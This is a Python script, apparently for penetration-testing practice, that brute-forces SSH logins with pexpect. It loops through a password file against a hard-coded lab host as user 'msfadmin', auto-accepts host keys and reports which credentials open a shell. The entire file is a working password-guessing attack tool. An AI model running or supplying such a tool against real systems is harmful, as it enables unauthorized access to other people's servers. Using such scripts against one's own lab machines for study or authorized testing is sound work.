#!/usr/bin/python3
import pexpect

PROMPT = [pexpect.TIMEOUT, pexpect.EOF, '#', '~$', '>', '>>>']
PASSWORD = '[Pp]assword:'


def ssh_connect(host, user, password):
    ssh_newkey = 'Are you sure you want to continue connecting'
    ssh_command = '/usr/bin/ssh ' + user + '@' + host

    child = pexpect.spawn(ssh_command)
    r = child.expect([pexpect.TIMEOUT, ssh_newkey, PASSWORD], timeout=5)
    if r == 0:
        print(f'[-] {host}: {user}@{password}')
        return None

    elif r == 1:
        child.sendline('yes')
        r = child.expect([pexpect.TIMEOUT, PASSWORD], timeout=5)
        if r == 0:
            print(f'[-] {host}: {user}@{password}')
            return None

    child.sendline(password)
    r = child.expect(PROMPT, timeout=5)
    if r == 0 or r == 1:
        print(f'[-] {host}: {user}@{password}')
        return None

    print(f'[+] {host}: {user}@{password} = {r}')
    return child


def main():
    host = '192.168.100.97'
    user = 'msfadmin'
    with open('passwords.txt', 'r') as f:
        for password in f.readlines():
            child = ssh_connect(host, user, password.strip('\n'))
        f.close()


if __name__ == '__main__':
    main()
